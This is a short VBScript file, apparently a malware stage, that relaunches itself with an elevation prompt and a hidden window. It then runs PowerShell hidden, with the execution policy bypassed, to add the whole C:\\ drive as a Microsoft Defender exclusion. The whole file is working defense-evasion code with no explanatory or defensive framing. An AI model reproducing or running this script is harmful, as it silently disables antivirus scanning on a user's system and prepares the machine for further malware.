Set objShell = CreateObject("Shell.Application")

Function IsElevated()
    Dim i
    For i = 0 To WScript.Arguments.Count - 1
        If LCase(WScript.Arguments(i)) = "/elevated" Then
            IsElevated = True
            Exit Function
        End If
    Next
    IsElevated = False
End Function

If Not IsElevated() Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 0
    WScript.Quit
End If

Dim psPath64
psPath64 = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

Dim psCommand
psCommand = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath 'C:\'"""

objShell.ShellExecute psPath64, psCommand, "", "open", 0
